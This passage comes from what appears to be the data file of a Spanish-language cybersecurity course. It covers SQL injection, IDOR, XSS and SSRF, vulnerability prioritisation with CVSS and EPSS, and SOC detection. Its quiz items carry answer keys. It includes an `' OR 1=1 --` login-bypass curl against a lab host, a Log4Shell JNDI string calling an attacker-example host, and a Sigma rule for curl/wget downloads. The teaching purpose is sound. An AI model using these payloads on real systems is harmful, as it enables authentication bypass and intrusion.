        definition: 'Insecure Direct Object Reference: acceder a un recurso de otro usuario cambiando su identificador (`/api/facturas/1002`) sin validación de pertenencia.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de probar: Si un formulario de login filtra las comillas simples con JavaScript en el navegador (Frontend), pero el servidor Node.js sigue concatenando el texto en SQL, ¿es seguro el servidor?',
      reveal: '¡Es totalmente vulnerable! Un atacante no necesita usar el formulario del navegador: enviará la petición directamente a la API con `curl` o un proxy (Burp Suite / Caido), saltándose por completo el JavaScript del navegador.',
    },
    theorySections: [
      {
        heading: '1. Inyección SQL (SQLi): De la Concatenación de Cadenas a las Consultas Parametrizadas',
        content:
          'Una inyección SQL ocurre cuando los datos proporcionados por el usuario se concatenan directamente dentro del comando SQL antes de que el motor de base de datos compile la consulta. Al introducir `\' OR 1=1 --`, el atacante cierra el literal de texto e inyecta un operador lógico booleano que altera la estructura misma del árbol sintáctico (AST) de la instrucción SQL. La solución definitiva son las Consultas Parametrizadas (Prepared Statements): el motor compila primero la estructura SQL con marcadores (`$1` o `?`) y posteriormente trata el parámetro exclusivamente como un valor escalar literal, nunca como código ejecutable.',
        codeSnippet: `// VULNERABLE: Concatenación directa
const q = "SELECT * FROM users WHERE username = '" + req.query.user + "'";

// SEGURO: Consulta Parametrizada (Prepared Statement en PostgreSQL)
const res = await db.query("SELECT * FROM users WHERE username = $1", [req.query.user]);`,
      },
      {
        heading: '2. Broken Access Control (IDOR), XSS y Server-Side Request Forgery (SSRF)',
        content:
          'Broken Access Control encabeza el OWASP Top 10: ocurre cuando la aplicación verifica que el usuario inició sesión (Autenticación), pero no valida si ese usuario específico tiene permiso sobre el recurso solicitado, como `/api/facturas/1042` (IDOR/BOLA). Por su parte, SSRF permite engañar al servidor backend para que realice peticiones HTTP hacia recursos internos inaccesibles desde Internet (como `http://127.0.0.1:8080/admin` o el servicio de metadatos cloud `http://169.254.169.254`).',
      },
    ],
    realWorldCase: {
      title: 'Compromiso Masivo por Inyección SQL y Escalada de Privilegios en Portales Financieros',
      context:
        'Un portal de banca corporativa filtraba caracteres especiales en el frontend con JavaScript, pero el endpoint `/api/login` concatenaba directamente el parámetro en una consulta PostgreSQL.',
      technicalRootCause:
        'Confiar en la validación del lado del cliente (fácilmente evadida usando `curl` o un proxy como Burp Suite / Caido) y carecer de consultas parametrizadas en el controlador backend.',
      lesson:
        'La validación en el navegador es solo para experiencia de usuario (UX); toda validación de seguridad, autorización y parametrización debe ejecutarse en el servidor.',
    },
    diagramType: 'owasp-sqli',
    diagramCaption:
      'Comparación del árbol de ejecución SQL (AST) ante un payload de inyección frente a una consulta parametrizada (Prepared Statement).',
    activeRecallQuestions: [
      {
        id: 'ar-07-1',
        question: '¿Por qué las Consultas Parametrizadas (Prepared Statements) neutralizan por completo la Inyección SQL incluso si el usuario envía comillas simples, comentarios `--` o cláusulas `UNION SELECT`?',
        options: [
          'Porque borran la base de datos si detectan la palabra UNION.',
          'Porque el motor SQL compila primero el plan de ejecución de la consulta y vincula el dato del usuario en una fase separada como un literal puro, impidiendo que modifique la gramática SQL.',
          'Porque bloquean la dirección IP del navegador mediante JavaScript.',
          'Porque convierten todas las letras a mayúsculas.',
        ],
        correctIndex: 1,
        explanation:
          'Al separar la compilación de la instrucción SQL del envío de los parámetros de datos, el motor de base de datos jamás interpreta el contenido del parámetro como parte de los comandos SQL.',
        commonMisconception: 'Creer que escapar comillas manualmente con `replace("\'", "")` es equivalente a usar Prepared Statements.',
      },
      {
        id: 'ar-07-2',
        question: '¿Qué bandera en la cabecera `Set-Cookie` impide que un script malicioso inyectado mediante Cross-Site Scripting (XSS) pueda leer el token de sesión a través de `document.cookie`?',
        options: ['SameSite=None', 'Domain=*', 'HttpOnly', 'Path=/'],
        correctIndex: 2,
        explanation:
          'El atributo `HttpOnly` instruye al navegador para que la cookie sea enviada únicamente en peticiones HTTP/HTTPS y prohíbe su acceso desde APIs de JavaScript como `document.cookie`.',
        commonMisconception: 'Almacenar tokens JWT sensibles en `localStorage`, donde cualquier payload XSS puede extraerlos trivialmente.',
      },
      {
        id: 'ar-07-3',
        question: 'Un usuario autenticado como `cliente_50` cambia la URL de `/api/pedidos/50` a `/api/pedidos/51` y el servidor le devuelve los datos privados del `cliente_51`. ¿Cómo se clasifica esta vulnerabilidad?',
        options: [
          'SQL Injection (CWE-89)',
          'Cross-Site Request Forgery (CSRF)',
          'Buffer Overflow en el Stack',
          'Broken Access Control / IDOR (Insecure Direct Object Reference — OWASP A01)',
        ],
        correctIndex: 3,
        explanation:
          'El servidor verificó la autenticación (quién es el usuario), pero olvidó verificar la autorización a nivel de objeto (si el pedido #51 pertenece realmente al usuario de la sesión activa).',
        commonMisconception: 'Creer que usar tokens JWT firmados evita IDOR automáticamente sin comprobar el propietario del recurso en la base de datos.',
      },
      {
        id: 'ar-07-4',
        question: '¿En qué consiste una vulnerabilidad de Server-Side Request Forgery (SSRF)?',
        options: [
          'En inducir a la aplicación del servidor a realizar peticiones HTTP hacia destinos no previstos (como `127.0.0.1` o el servicio de metadatos cloud `169.254.169.254`) abusando de una funcionalidad que descarga URLs.',
          'En inyectar código JavaScript en los comentarios de un blog.',
          'En adivinar contraseñas por fuerza bruta en el formulario de login.',
          'En interceptar paquetes Wi-Fi en una cafetería.',
        ],
        correctIndex: 0,
        explanation:
          'En SSRF, el servidor actúa como un proxy involuntario a favor del atacante, permitiéndole alcanzar servicios internos detrás del firewall o robar credenciales IAM del entorno cloud.',
        commonMisconception: 'Confundir CSRF (el navegador del cliente hace una petición) con SSRF (el servidor backend hace la petición).',
      },
      {
        id: 'ar-07-5',
        question: '¿Qué cabecera de respuesta HTTP permite restringir desde qué orígenes puede el navegador cargar y ejecutar scripts, mitigando el impacto de vulnerabilidades XSS?',
        options: [
          'X-Powered-By',
          'Content-Security-Policy (CSP)',
          'Accept-Language',
          'User-Agent',
        ],
        correctIndex: 1,
        explanation:
          'Una cabecera `Content-Security-Policy` bien configurada (por ejemplo, sin `unsafe-inline` y con nonces/hashes estrictos) impide que el navegador ejecute bloques `<script>` inyectados por un atacante.',
        commonMisconception: 'Pensar que la cabecera `CORS` (`Access-Control-Allow-Origin`) previene ataques XSS.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-07-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Auditas un controlador en Node.js que usa un ORM/Query Builder pero escribe: `db.raw(\`SELECT * FROM cuentas WHERE id = ${req.params.id}\`)`. El desarrollador afirma que "como usa un ORM moderno, es inmune a SQL Injection". ¿Cuál es tu dictamen técnico?',
      options: [
        'Tiene razón; cualquier librería ORM bloquea las inyecciones aunque uses template literals.',
        'Es vulnerable a SQL Injection: interpolar `${req.params.id}` dentro de un template string de JavaScript concatena el texto ANTES de enviarlo al ORM, exactamente igual que usar `+`. Debe pasarse como parámetro vinculado (`$1` o `?`).',
        'Solo es vulnerable si la base de datos es MySQL, pero no en PostgreSQL.',
        'El único problema es un fallo de diseño visual CSS.',
      ],
      correctIndex: 1,
      explanation:
        'Un template literal de JavaScript (`` `... ${var}` ``) se evalúa en Node.js antes de que la función `db.raw` reciba la cadena, por lo que el motor SQL recibe la consulta ya concatenada y vulnerable.',
      commonMisconception: 'Confundir la interpolación de cadenas de JavaScript (`${}`) con las consultas parametrizadas del motor SQL (`$1`).',
    },
    selfExplanationPrompt: {
      question:
        'Explica con tus propias palabras qué sucede en el backend cuando una consulta SQL vulnerable (`SELECT * FROM users WHERE username = \'input\'`) recibe el valor `\' OR 1=1 --` y cómo debes refactorizar ese código en Node.js o Python.',
      guidingSubQuestions: [
        '¿Qué función cumple la comilla simple inicial y qué hace el comentario `--` con el resto de la consulta original?',
        '¿Cómo cambia el flujo cuando usas marcadores de posición (`$1` o `?`)?',
      ],
      keyTerms: ['comilla', 'condicion', 'comentario', 'parametrizada', 'consulta'],
      exemplarAnswer:
        'La comilla simple cierra prematuramente el campo de texto username, el operador OR 1=1 introduce una condición que siempre se evalúa como verdadera para todas las filas de la tabla, y el doble guion (--) comenta el resto de la consulta original (como la verificación de contraseña). Para corregirlo en el backend se reemplaza la concatenación de cadenas por una consulta parametrizada usando marcadores como $1, pasando las variables en un arreglo separado.',
    },
    deliberatePractice: {
      prompt:
        'Audita el código fuente con `cat auth_controller.js` y luego ejecuta `curl "http://10.10.10.80/api/login?user=\' OR 1=1 --"` en la terminal.',
      scenario: 'En el laboratorio de Seguridad Web debes comprobar si el parámetro `user` del portal financiero es vulnerable a bypass de autenticación.',
      starterCommandOrCode: 'curl "http://10.10.10.80/api/login?user=\' OR 1=1 --"',
      expectedPatterns: ['curl', '10.10.10.80', 'OR', '1=1', 'auth_controller.js'],
      hint: 'Ejecuta `cat auth_controller.js` y después `curl "http://10.10.10.80/api/login?user=\' OR 1=1 --"`.',
      feedbackSuccess:
        'Excelente demostración práctica. Has comprobado cómo la concatenación no parametrizada permite evadir la condición de autenticación.',
      feedbackError: 'Ejecuta `curl "http://10.10.10.80/api/login?user=\' OR 1=1 --"` en la terminal.',
    },
    knowledgeSummary: [
      'La única defensa completa contra SQL Injection es el uso estricto de Consultas Parametrizadas (Prepared Statements).',
      'Contra XSS: aplica codificación contextual de salida (Output Encoding), evita `dangerouslySetInnerHTML`/`innerHTML` sin sanitizar (DOMPurify) y despliega una política `Content-Security-Policy` (CSP) más cookies `HttpOnly; Secure; SameSite=Strict`.',
      'Valida siempre la autorización a nivel de objeto (propiedad del recurso) en cada endpoint del servidor para prevenir IDOR/BOLA.',
    ],
    spanishVideos: [
      {
        title: 'OWASP SQL Injection Prevention Cheat Sheet',
        author: 'OWASP Foundation',
        duration: 'Estándar Defensivo',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
        focus: 'Ejemplos de código parametrizado y defensas contra inyección en motores SQL.',
      },
      {
        title: 'PortSwigger Web Security Academy — SQL Injection, XSS, CSRF & SSRF',
        author: 'PortSwigger Research',
        duration: 'Academia Interactiva',
        url: 'https://portswigger.net/web-security/all-materials',
        focus: 'Materiales técnicos de referencia mundial sobre explotación y remediación de vulnerabilidades web.',
      },
    ],
    officialDocs: [
      {
        title: 'OWASP Top 10 Official Standard & Prevention Cheat Sheets',
        organization: 'OWASP Foundation',
        url: 'https://owasp.org/www-project-top-ten/',
        type: 'Estándar Oficial',
      },
      {
        title: 'PortSwigger Web Security Academy — Interactive Labs & Learning Materials',
        organization: 'PortSwigger',
        url: 'https://portswigger.net/web-security',
        type: 'Laboratorio Externo',
      },
    ],
    linkedLabId: 'lab-web-sqli',
  },
  {
    id: 'mod-08',
    number: '08',
    title: 'Análisis y Gestión de Vulnerabilidades (CVE, CVSS, EPSS y SAST/DAST)',
    tier: 'Intermedio',
    domain: 'Vulnerabilidades',
    estimatedHours: 12,
    summary:
      'Aprende a descubrir, clasificar y priorizar vulnerabilidades con criterio de ingeniería: nomenclatura CVE/CWE, cálculo de severidad CVSS v3.1/v4.0, probabilidad de explotación real EPSS, catálogo CISA KEV y pruebas SAST/DAST/SCA.',
    objectives: [
      'Interpretar vectores CVSS (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope y CIA Impact).',
      'Explicar por qué priorizar parches únicamente por puntaje CVSS es ineficiente y cómo combinarlo con EPSS y CISA KEV.',
      'Integrar análisis estático (SAST), dinámico (DAST) y de composición de software (SCA / SBOM) en el ciclo de vida de desarrollo.',
    ],
    glossary: [
      {
        term: 'EPSS',
        definition: 'Exploit Prediction Scoring System: probabilidad empírica (0 a 100%) de que una vulnerabilidad CVE sea explotada en los próximos 30 días.',
      },
      {
        term: 'CISA KEV',
        definition: 'Catálogo oficial de vulnerabilidades cuya explotación activa en el mundo real ha sido confirmada.',
      },
      {
        term: 'SCA / SBOM',
        definition: 'Software Composition Analysis / Bill of Materials: inventario y auditoría de librerías y dependencias de terceros.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de leer: Si tienes una vulnerabilidad con CVSS 9.0 en una librería que no tiene ningún exploit conocido (EPSS 0.001) en una red interna aislada, y otra con CVSS 7.5 en tu firewall perimetral que está en la lista CISA KEV (EPSS 0.96), ¿cuál parcheas hoy mismo?',
      reveal: '¡Parcheas primero la de CVSS 7.5 del perímetro! Porque estar en CISA KEV con EPSS 0.96 significa que los atacantes ya la están explotando activamente en Internet hoy mismo.',
    },
    theorySections: [
      {
        heading: '1. De CWE a CVE y el Cálculo Técnico de Severidad CVSS',
        content:
          'Mientras CWE (Common Weakness Enumeration) describe el tipo de debilidad abstracta (por ejemplo, `CWE-89: SQL Injection`), CVE (Common Vulnerabilities and Exposures) identifica un fallo específico en un producto concreto. CVSS asigna una puntuación numérica de 0.0 a 10.0 midiendo la facilidad de explotación y el impacto técnico; sin embargo, CVSS mide severidad teórica, no riesgo ni explotación activa.',
        codeSnippet: `# Ejemplo de Vector CVSS v3.1 Crítico (9.8) - Ejecución Remota sin Autenticación:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
# AV:N (Red) | AC:L (Complejidad Baja) | PR:N (Sin Privilegios) | UI:N (Sin Interacción)`,
      },
      {
        heading: '2. Priorización Inteligente Basada en Riesgo: EPSS + CISA KEV + Contexto del Activo',
        content:
          'En una empresa con miles de CVEs, intentar parchear todo lo que tenga CVSS >= 7.0 colapsa a los equipos de ingeniería. Un profesional Senior cruza tres variables: (1) ¿Está en el catálogo CISA KEV (Known Exploited Vulnerabilities, explotada activamente en el mundo real)? (2) ¿Cuál es su índice EPSS (Exploit Prediction Scoring System, probabilidad de ser explotada en los próximos 30 días)? (3) ¿Está el servicio expuesto a Internet o contiene activos críticos?',
      },
    ],
    realWorldCase: {
      title: 'Explotación Masiva de Log4Shell (CVE-2021-44228) y Gestión de Dependencias Transitivas (SCA)',
      context:
        'La librería Java `log4j-core` permitía inyección JNDI/LDAP al registrar cualquier cadena de texto controlada por el usuario (`${jndi:ldap://atacante.example/a}`), otorgando ejecución remota de código instantánea.',
      technicalRootCause:
        'Evaluación dinámica de búsquedas (Lookups) remotas dentro de mensajes de log y desconocimiento por parte de las empresas de qué aplicaciones incluían Log4j como dependencia oculta (falta de SBOM / SCA).',
      lesson:
        'Mantener un inventario actualizado de componentes (SBOM), automatizar escaneos SCA en CI/CD y deshabilitar funcionalidades de resolución remota innecesarias.',
    },
    diagramType: 'vuln-lifecycle',
    diagramCaption:
      'Matriz de decisión para priorización de vulnerabilidades combinando CVSS (Severidad), EPSS (Probabilidad), CISA KEV y Exposición del Activo.',
    activeRecallQuestions: [
      {
        id: 'ar-08-1',
        question: 'En el vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, ¿qué significa exactamente el componente `S:C` (Scope: Changed)?',
        options: [
          'Que el código fuente fue escrito en lenguaje C.',
          'Que la vulnerabilidad reside en un componente pero su explotación permite impactar recursos más allá de su propio ámbito de seguridad (por ejemplo, escapar de una máquina virtual o contenedor hacia el host).',
          'Que la vulnerabilidad ya fue corregida por el fabricante.',
          'Que requiere acceso físico a la consola.',
        ],
        correctIndex: 1,
        explanation:
          '`Scope: Changed (S:C)` indica que el componente vulnerable y el componente impactado pertenecen a autoridades de seguridad diferentes (ej. XSS donde el servidor web es vulnerable pero el impacto ocurre en el navegador del cliente, o un escape de VM hacia el hipervisor).',
        commonMisconception: 'Ignorar la métrica Scope (`S:U` vs `S:C`) al evaluar el radio de impacto de una vulnerabilidad.',
      },
      {
        id: 'ar-08-2',
        question: 'Tienes dos vulnerabilidades: Vuln A tiene CVSS 8.1 en un servidor interno aislado sin exploit público (EPSS 0.002). Vuln B tiene CVSS 7.5 en un gateway VPN expuesto a Internet y figura en el catálogo CISA KEV con EPSS 0.94. ¿Cuál debes remediar primero y por qué?',
        options: [
          'Vuln A, porque 8.1 es matemáticamente mayor que 7.5.',
          'Ninguna, porque ambas son menores a 9.0.',
          'Vuln B con urgencia inmediata, porque está expuesta en el perímetro, tiene explotación activa confirmada (CISA KEV) y altísima probabilidad de ataque (EPSS 94%).',
          'Ambas el próximo trimestre sin distinción.',
        ],
        correctIndex: 2,
        explanation:
          'La gestión de vulnerabilidades basada en riesgo prioriza la amenaza real y la exposición: una vulnerabilidad en el perímetro incluida en CISA KEV está siendo atacada activamente por grupos automatizados.',
        commonMisconception: 'Ordenar las hojas de cálculo de vulnerabilidades únicamente de mayor a menor CVSS sin considerar exposición ni KEV/EPSS.',
      },
      {
        id: 'ar-08-3',
        question: '¿Qué tipo de herramienta DevSecOps inspecciona específicamente los archivos de manifiesto (`package-lock.json`, `requirements.txt`, `pom.xml`) para detectar librerías de terceros con CVEs conocidos?',
        options: [
          'DAST (Dynamic Application Security Testing)',
          'Firewall de Capa 3',
          'Fuzzer de kernel',
          'SCA (Software Composition Analysis) y generación de SBOM',
        ],
        correctIndex: 3,
        explanation:
          'Las herramientas SCA (como Trivy, Snyk o Dependabot) construyen el árbol de dependencias directas y transitivas (SBOM) y lo cruzan contra bases de datos de vulnerabilidades CVE.',
        commonMisconception: 'Esperar que un analizador SAST de código propio detecte CVEs en librerías binarias o paquetes descargados.',
      },
      {
        id: 'ar-08-4',
        question: 'En un vector CVSS, ¿qué indica la combinación `AV:N/AC:L/PR:N/UI:N`?',
        options: [
          'Que la vulnerabilidad es explotable remotamente por red, con baja complejidad, sin requerir credenciales previas y sin que ningún usuario tenga que hacer clic ("Zero-Click").',
          'Que solo puede explotarse conectando un cable USB físico al servidor.',
          'Que requiere permisos de Administrador de Dominio previos.',
          'Que no tiene impacto en la confidencialidad.',
        ],
        correctIndex: 0,
        explanation:
          '`AV:N` (Network), `AC:L` (Low complexity), `PR:N` (No privileges) y `UI:N` (No user interaction) describen el perfil más peligroso de vulnerabilidad perimetral.',
        commonMisconception: 'No leer las siglas individuales del vector CVSS y fijarse solo en el número final.',
      },
      {
        id: 'ar-08-5',
        question: '¿Cuál es la diferencia conceptual entre `CWE-79` y `CVE-2021-44228`?',
        options: [
          'Son exactamente el mismo identificador.',
          '`CWE` describe la clase o categoría abstracta de debilidad (Cross-Site Scripting), mientras que `CVE` identifica una vulnerabilidad concreta en una versión específica de un producto (Log4Shell en Apache Log4j).',
          '`CVE` solo aplica a hardware de red y `CWE` solo a Windows.',
          '`CWE` mide la probabilidad de explotación de 0 a 1.',
        ],
        correctIndex: 1,
        explanation:
          'CWE (Common Weakness Enumeration) es el diccionario de tipos de fallos de software; CVE (Common Vulnerabilities and Exposures) es el registro de instancias concretas descubiertas en productos específicos.',
        commonMisconception: 'Usar los términos CVE, CWE y CVSS como si fueran sinónimos.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-08-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Se publica un CVE crítico (CVSS 9.8, incluido en CISA KEV) en el servidor web de facturación de tu empresa, pero el fabricante tardará 5 días en lanzar el parche oficial. ¿Qué debe hacer el equipo de seguridad hoy mismo?',
      options: [
        'Esperar los 5 días sin tocar nada porque no existe parche oficial.',
        'Aplicar inmediatamente un control compensatorio (Mitigación Temporal / Virtual Patching): restringir el acceso al endpoint vulnerable en el WAF/Firewall, deshabilitar el módulo afectado y activar reglas de detección en el SIEM hasta aplicar el parche definitivo.',
        'Apagar todos los servidores de la empresa durante un mes.',
        'Cambiar el puntaje CVSS en el reporte interno a 2.0.',
      ],
      correctIndex: 1,
      explanation:
        'Cuando el parche del fabricante aún no está disponible o requiere ventana de cambio, la ingeniería de seguridad aplica controles compensatorios (WAF, aislamiento de red, desactivación de la característica vulnerable) para reducir la exposición de inmediato.',
      commonMisconception: 'Confundir "parchear el binario" con la única forma posible de mitigar un riesgo activo.',
    },
    selfExplanationPrompt: {
      question:
        'Explica la diferencia entre herramientas SAST, DAST y SCA dentro de un pipeline DevSecOps, indicando qué tipo de vulnerabilidad detecta mejor cada una y cuáles son sus limitaciones.',
      guidingSubQuestions: [
        '¿Cuál de las tres analiza el código fuente sin ejecutarlo y cuál interactúa con la aplicación ya desplegada?',
        '¿Por qué SAST no suele detectar una librería de terceros desactualizada ni un error de configuración en el servidor Nginx?',
      ],
      keyTerms: ['sast', 'dast', 'sca', 'codigo', 'dependencias'],
      exemplarAnswer:
        'SAST (Static Application Security Testing) analiza el código fuente o bytecode sin ejecutarlo, siendo ideal para hallar concatenaciones SQL o funciones inseguras temprano, aunque puede generar falsos positivos. DAST (Dynamic Application Security Testing) prueba la aplicación en ejecución desde fuera como una caja negra, detectando fallos de configuración del servidor, cabeceras o autenticación en tiempo real. SCA (Software Composition Analysis) inspecciona los archivos de paquetes (package.json, pom.xml) para identificar vulnerabilidades CVE en librerías y dependencias de terceros.',
    },
    deliberatePractice: {
      prompt:
        'Ejecuta `nmap -sV 10.10.10.45` y luego valida activamente el servicio expuesto con `curl http://10.10.10.45:8080`.',
      scenario: 'Debes identificar servicios obsoletos y validar la exposición de la consola de depuración en el puerto 8080.',
      starterCommandOrCode: 'curl http://10.10.10.45:8080',
      expectedPatterns: ['nmap', '10.10.10.45', 'curl', '8080'],
      hint: 'Ejecuta `nmap -sV 10.10.10.45` y luego `curl http://10.10.10.45:8080`.',
      feedbackSuccess:
        'Excelente. Has correlacionado la enumeración de versiones con la validación activa del servicio expuesto y su clasificación CVE/EPSS.',
      feedbackError: 'Apunta el comando `curl http://10.10.10.45:8080` para verificar el servicio vulnerable.',
    },
    knowledgeSummary: [
      'CWE clasifica el tipo de fallo; CVE identifica la instancia específica; CVSS mide severidad técnica; EPSS y CISA KEV miden probabilidad y explotación activa.',
      'Un programa maduro combina SAST (código propio), SCA (dependencias y SBOM), DAST (aplicación en ejecución) y Pentesting manual (lógica de negocio).',
    ],
    spanishVideos: [
      {
        title: 'FIRST EPSS (Exploit Prediction Scoring System) Model & Data',
        author: 'FIRST.org',
        duration: 'Estándar Oficial',
        url: 'https://www.first.org/epss/model',
        focus: 'Cómo se calcula la probabilidad empírica de explotación y cómo cruzarla con CVSS.',
      },
      {
        title: 'CISA Known Exploited Vulnerabilities (KEV) Catalog',
        author: 'CISA',
        duration: 'Catálogo en Vivo',
        url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
        focus: 'Lista oficial de vulnerabilidades explotadas activamente de remediación prioritaria.',
      },
    ],
    officialDocs: [
      {
        title: 'FIRST CVSS v4.0 & EPSS (Exploit Prediction Scoring System) Official Specifications',
        organization: 'FIRST.org',
        url: 'https://www.first.org/epss/',
        type: 'Estándar Oficial',
      },
      {
        title: 'CISA Known Exploited Vulnerabilities (KEV) Catalog',
        organization: 'Cybersecurity and Infrastructure Security Agency (CISA)',
        url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
        type: 'Estándar Oficial',
      },
    ],
    linkedLabId: 'lab-network-recon',
  },
  {
    id: 'mod-09',
    number: '09',
    title: 'Blue Team, Operaciones SOC, SIEM y Threat Hunting',
    tier: 'Avanzado / Senior',
    domain: 'Blue Team & SOC',
    estimatedHours: 16,
    summary:
      'Conviértete en un defensor de élite: ingeniería de detección con reglas Sigma y YARA, correlación de eventos en SIEM, telemetría avanzada con Sysmon y auditd, mapeo de tácticas MITRE ATT&CK y caza proactiva de amenazas (Threat Hunting).',
    objectives: [
      'Utilizar la matriz MITRE ATT&CK para mapear Tácticas, Técnicas y Procedimientos (TTPs) de un adversario más allá de indicadores efímeros.',
      'Aplicar la Pirámide del Dolor (Pyramid of Pain) de David Bianco para diseñar detecciones resilientes basadas en comportamiento.',
      'Analizar registros `auth.log`, Sysmon (Event ID 1, 3, 10, 11) y Windows Security Logs (4624, 4625, 4688, 4672) para reconstruir una intrusión.',
    ],
    glossary: [
      {
        term: 'Pirámide del Dolor',
        definition: 'Modelo que jerarquiza indicadores desde los más fáciles de cambiar para el atacante (Hashes, IPs) hasta los más costosos (TTPs / Comportamientos).',
      },
      {
        term: 'Regla Sigma',
        definition: 'Formato YAML abierto y universal para describir detecciones sobre logs que puede traducirse a cualquier SIEM.',
      },
      {
        term: 'Living off the Land (LotL)',
        definition: 'Uso de binarios legítimos preinstalados del sistema (`curl`, `powershell`, `certutil`) para ejecutar ataques sin dejar malware tradicional.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de analizar: Si tu única defensa en el SIEM es una lista negra con el hash SHA-256 de un binario malicioso, ¿cuánto tardará el atacante en evadir tu regla?',
      reveal: 'Menos de 5 segundos: le basta añadir un solo byte o espacio al final de su archivo para que el hash SHA-256 cambie por completo. En cambio, si detectas el comportamiento (TTP: un servicio web ejecutando `curl` hacia `/tmp/`), lo atraparás sin importar el hash.',
    },
    theorySections: [
      {
        heading: '1. La Pirámide del Dolor, MITRE ATT&CK e Ingeniería de Detección con Sigma',
        content:
          'Bloquear hashes de archivos o direcciones IP (la base de la Pirámide del Dolor) es trivial de evadir para un atacante: basta recompilar el binario o cambiar de servidor VPS. En cambio, detectar Comportamientos y TTPs mapeados en MITRE ATT&CK (por ejemplo, `T1003.001 OS Credential Dumping: LSASS Memory` o que un servidor web `nginx` engendre un proceso hijo `/bin/bash` que ejecute `curl`) obliga al atacante a rediseñar por completo su operativa. Las reglas Sigma permiten escribir estas detecciones en un formato YAML agnóstico y compilarlas hacia cualquier SIEM (Elastic, Splunk, Sentinel).',
        codeSnippet: `# Regla Sigma conceptual: Detección de descarga sospechosa desde proceso de servicio
title: Descarga de Binario en /tmp via Curl o Wget
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith: ['/curl', '/wget']
    CommandLine|contains: ['/tmp/.', '.elf', '.sh']
  condition: selection
level: high`,
      },
      {
        heading: '2. Telemetría Crítica en Endpoints: Linux auditd y Windows Sysmon',
        content:
          'Los logs por defecto de un sistema operativo no registran la línea de comandos completa ni el árbol de procesos padre-hijo. En Windows, Sysmon aporta visibilidad quirúrgica: Event ID 1 (Creación de proceso con hash y CommandLine completa), Event ID 3 (Conexión de red por proceso), Event ID 10 (Acceso a otro proceso, vital para detectar volcado de `lsass.exe`) y Event ID 11 (Creación de archivos). En Linux, `auditd` y sensores eBPF registran cada syscall `execve`.',
      },
    ],
    realWorldCase: {
      title: 'Detección de Intrusión Post-Explotación (Living off the Land — LotL)',
      context:
        'Un grupo de intrusión accedió mediante una clave SSH comprometida del usuario `deploy` desde `203.0.113.42` y utilizó binarios legítimos del sistema (`curl`, `chmod`, `crontab`) para establecer persistencia con un archivo oculto `/tmp/.systemd-sync`.',
      technicalRootCause:
        'El antivirus tradicional no alertó al principio porque el atacante usó herramientas nativas del sistema ("Living off the Land"), pero la correlación de `auth.log` + auditoría de comandos `sudo` reveló la descarga desde una IP externa tras múltiples fallos de fuerza bruta.',
      lesson:
        'Monitorear la cadena de ejecución de comandos (CommandLine auditing) y correlacionar eventos de autenticación con conexiones de red salientes.',
    },
    diagramType: 'siem-pipeline',
    diagramCaption:
      'Flujo de Ingeniería de Detección en un SOC: Ingesta de telemetría (Sysmon/auditd/Red) -> Reglas Sigma/Correlación -> Triage -> Respuesta y Contención.',
    activeRecallQuestions: [
      {
        id: 'ar-09-1',
        question: 'Según la Pirámide del Dolor (Pyramid of Pain) de David Bianco, ¿qué tipo de indicador es el MÁS costoso de modificar para un adversario cuando el Blue Team logra detectarlo?',
        options: [
          'Valores Hash (MD5/SHA-256) del malware.',
          'Direcciones IP de los servidores de comando y control.',
          'Nombres de dominio.',
          'TTPs (Tácticas, Técnicas y Procedimientos / comportamiento del atacante).',
        ],
        correctIndex: 3,
        explanation:
          'En la cúspide de la Pirámide del Dolor se encuentran los TTPs (comportamientos, como volcar memoria de LSASS o ejecutar shells desde procesos web). Si detectas el comportamiento, el atacante no puede simplemente cambiar de IP o recompilar el ejecutable.',
        commonMisconception: 'Basar toda la estrategia de un SOC únicamente en listas negras de IPs y hashes.',
      },
      {
        id: 'ar-09-2',
        question: 'En Windows Sysmon, ¿qué Event ID específico debes monitorear en el SIEM para detectar que un proceso malicioso (como Mimikatz) está abriendo un handle de lectura sobre la memoria de `lsass.exe`?',
        options: ['Sysmon Event ID 1 (Process Creation)', 'Sysmon Event ID 10 (ProcessAccess)', 'Sysmon Event ID 22 (DNSEvent)', 'Windows Event ID 4625'],
        correctIndex: 1,
        explanation:
          'Sysmon Event ID 10 (`ProcessAccess`) registra cuando un proceso abre otro proceso (especificando `TargetImage: C:\\Windows\\system32\\lsass.exe` y la máscara de acceso `GrantedAccess`), siendo la fuente principal para detectar robo de credenciales en memoria.',
        commonMisconception: 'Buscar únicamente el nombre "mimikatz.exe" en Event ID 1, lo cual falla si el atacante renombra el binario o inyecta en memoria.',
      },
      {
        id: 'ar-09-3',
        question: '¿Qué combinación de eventos en los registros de seguridad sugiere un ataque de Fuerza Bruta exitoso seguido de compromiso de cuenta?',
        options: [
          'Un único evento 4624 sin actividad posterior.',
          'Múltiples eventos de fallo de autenticación (`Failed password` / Windows Event ID 4625) desde una misma IP seguidos de un inicio de sesión exitoso (`Accepted` / Event ID 4624) y ejecución de comandos privilegiados.',
          'El reinicio programado del servicio NTP.',
          'Consultas DNS hacia el controlador de dominio interno.',
        ],
        correctIndex: 1,
        explanation:
          'La correlación temporal entre ráfagas de fallos de autenticación y un acceso aceptado desde el mismo origen u horario indica que el atacante logró descubrir o reutilizar una credencial válida.',
        commonMisconception: 'Crear alertas que solo miran inicios de sesión fallidos pero no verifican si después hubo un inicio exitoso.',
      },
      {
        id: 'ar-09-4',
        question: '¿Para qué sirve el estándar de reglas **Sigma** en la ingeniería de detección de un SOC?',
        options: [
          'Para cifrar discos duros en Linux.',
          'Para reemplazar el protocolo TCP por UDP.',
          'Para escribir reglas de detección sobre logs en un formato YAML abierto e independiente del fabricante, que luego se compila a consultas nativas de Splunk, Elastic o Sentinel.',
          'Para escanear puertos abiertos desde Internet.',
        ],
        correctIndex: 2,
        explanation:
